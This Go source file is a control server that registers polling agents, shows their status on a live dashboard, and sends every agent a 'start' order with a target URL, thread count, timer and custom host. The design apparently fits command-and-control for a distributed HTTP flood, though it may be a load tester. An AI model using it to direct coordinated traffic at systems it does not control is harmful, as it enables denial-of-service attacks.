// Control_Server.go
package main

import (
	"encoding/json"
	"fmt"
	"html/template"
	"net/http"
	"strconv"
	"sync"
	"time"
)

// -----------------------------
// 1) Data models (unchanged):
// -----------------------------

type Command struct {
	Action     string `json:"action"`
	URL        string `json:"url"`
	Threads    int    `json:"threads"`
	Timer      int    `json:"timer"`
	CustomHost string `json:"custom_host"`
}

type AgentStatus struct {
	Online   bool   `json:"Online"`
	Status   string `json:"Status"`
	LastPing string `json:"LastPing"`
}

// -----------------------------
// 2) Global state & mutex:
// -----------------------------

var (
	mu               sync.Mutex
	registeredAgents = make(map[string]bool)         // agentID → registered?
	pendingCommands  = make(map[string]Command)      // agentID → next Command
	agentStatuses    = make(map[string]*AgentStatus) // agentID → current status
)

// Reduce the offline timeout to 3s (instead of 10s)
const offlineTimeout = 3 * time.Second

// -----------------------------
// 3) SSE infrastructure (no external imports):
// -----------------------------

type sseClient struct {
	id      string
	writer  http.ResponseWriter
	flusher http.Flusher
}

var (
	sseMu      sync.Mutex
	sseClients = make(map[string]*sseClient)
)

// sendEvent broadcasts a JSON payload to all SSE clients.
func sendEvent(eventName string, data interface{}) {
	payload, err := json.Marshal(data)
	if err != nil {
		return
	}

	sseMu.Lock()
	defer sseMu.Unlock()
	for _, client := range sseClients {
		fmt.Fprintf(client.writer, "event: %s\n", eventName)
		fmt.Fprintf(client.writer, "data: %s\n\n", payload)
		client.flusher.Flush()
	}
}

// sseHandler upgrades GET /events into a long‐lived SSE stream.
func sseHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Required SSE headers:
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")

	// Ensure the ResponseWriter supports flushing:
	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "Streaming unsupported", http.StatusInternalServerError)
		return
	}

	// Generate a simple client ID via timestamp:
	clientID := fmt.Sprintf("%d", time.Now().UnixNano())
	client := &sseClient{
		id:      clientID,
		writer:  w,
		flusher: flusher,
	}

	sseMu.Lock()
	sseClients[clientID] = client
	sseMu.Unlock()

	// Send an initial comment line to keep the connection open
	fmt.Fprintf(w, ": connected\n\n")
	flusher.Flush()

	// Wait until the client disconnects
	<-r.Context().Done()

	// Remove this client from the map
	sseMu.Lock()
	delete(sseClients, clientID)
	sseMu.Unlock()
}

// -----------------------------
// 4) HTTP Handlers (unchanged, except they still call sendEvent):
// -----------------------------

func renderInterface(w http.ResponseWriter, r *http.Request) {
	const filePath = "Interface/index.html"
	tmpl, err := template.ParseFiles(filePath)
	if err != nil {
		http.Error(w, "Error loading template", http.StatusInternalServerError)
		fmt.Printf("[CONTROL] Template error: %v\n", err)
		return
	}
	tmpl.Execute(w, nil)
}

func handleCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Invalid method", http.StatusMethodNotAllowed)
		return
	}

	url := r.FormValue("url")
	threads, _ := strconv.Atoi(r.FormValue("threads"))
	timer, _ := strconv.Atoi(r.FormValue("timer"))
	customHost := r.FormValue("custom_host")

	cmd := Command{
		Action:     "start",
		URL:        url,
		Threads:    threads,
		Timer:      timer,
		CustomHost: customHost,
	}

	mu.Lock()
	for agentID := range registeredAgents {
		pendingCommands[agentID] = cmd
		fmt.Printf("[CONTROL] Enqueued START for %s → %+v\n", agentID, cmd)

		// Push an SSE “command-enqueued” event immediately
		sendEvent("command-enqueued", map[string]interface{}{
			"agentID": agentID,
			"command": cmd,
		})
	}
	mu.Unlock()

	http.Redirect(w, r, "/", http.StatusSeeOther)
}

func agentPollHandler(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("agentID")
	if agentID == "" {
		http.Error(w, "agentID required", http.StatusBadRequest)
		return
	}

	now := time.Now().Format(time.RFC3339)

	mu.Lock()
	registeredAgents[agentID] = true
	if entry, exists := agentStatuses[agentID]; exists {
		entry.Online = true
		entry.LastPing = now
	} else {
		agentStatuses[agentID] = &AgentStatus{
			Online:   true,
			Status:   "Ready",
			LastPing: now,
		}
	}

	if cmd, exists := pendingCommands[agentID]; exists {
		delete(pendingCommands, agentID)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(cmd)
		mu.Unlock()
		return
	}
	mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(Command{Action: "none"})
}

func agentStatusHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Invalid method", http.StatusMethodNotAllowed)
		return
	}

	var payload struct {
		AgentID string `json:"agentID"`
		Status  string `json:"status"`
	}
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	now := time.Now().Format(time.RFC3339)

	mu.Lock()
	if entry, exists := agentStatuses[payload.AgentID]; exists {
		entry.Status = payload.Status
		entry.LastPing = now
		entry.Online = true
	} else {
		agentStatuses[payload.AgentID] = &AgentStatus{
			Online:   true,
			Status:   payload.Status,
			LastPing: now,
		}
		registeredAgents[payload.AgentID] = true
	}
	updated := *agentStatuses[payload.AgentID]
	mu.Unlock()

	fmt.Printf("[CONTROL] Updated status of %s → %s at %s\n",
		payload.AgentID, updated.Status, updated.LastPing)

	// Broadcast the updated status via SSE
	sendEvent("agent-status-changed", map[string]interface{}{
		"agentID": payload.AgentID,
		"status":  updated,
	})

	w.WriteHeader(http.StatusOK)
}

func listAgentStatuses(w http.ResponseWriter, r *http.Request) {
	mu.Lock()
	out := make(map[string]AgentStatus, len(agentStatuses))
	for id, ptr := range agentStatuses {
		copyEntry := *ptr
		if !copyEntry.Online {
			copyEntry.Status = ""
		}
		out[id] = copyEntry
	}
	mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(out)
}

// -----------------------------
// 5) Background: mark stale agents offline faster
// -----------------------------

func watchForOfflineAgents() {
	// Check every 100ms instead of 1s
	ticker := time.NewTicker(100 * time.Millisecond)
	defer ticker.Stop()

	for range ticker.C {
		cutoff := time.Now().Add(-offlineTimeout)
		mu.Lock()
		for agentID, statusPtr := range agentStatuses {
			last, err := time.Parse(time.RFC3339, statusPtr.LastPing)
			if err != nil {
				statusPtr.Online = false
				continue
			}
			if last.Before(cutoff) {
				if statusPtr.Online {
					fmt.Printf("[CONTROL] Marking agent %s as OFFLINE (last ping: %s)\n",
						agentID, statusPtr.LastPing)
				}
				statusPtr.Online = false
				statusPtr.Status = ""

				// Broadcast the offline event immediately
				sendEvent("agent-status-changed", map[string]interface{}{
					"agentID": agentID,
					"status":  *statusPtr,
				})
			}
		}
		mu.Unlock()
	}
}

// -----------------------------
// 6) main(): wire it all up
// -----------------------------

func main() {
	// Serve static files under “Interface/”
	fs := http.FileServer(http.Dir("Interface"))
	http.Handle("/Interface/", http.StripPrefix("/Interface/", fs))

	http.HandleFunc("/", renderInterface)
	http.HandleFunc("/command", handleCommand)
	http.HandleFunc("/poll-agent", agentPollHandler)
	http.HandleFunc("/agent-status", agentStatusHandler)
	http.HandleFunc("/agent-statuses", listAgentStatuses)
	http.HandleFunc("/events", sseHandler)

	// Launch the faster “mark offline” goroutine
	go watchForOfflineAgents()

	fmt.Println("[CONTROL] Listening at http://localhost:8080")
	if err := http.ListenAndServe(":8080", nil); err != nil {
		fmt.Printf("[CONTROL] ListenAndServe error: %v\n", err)
	}
}
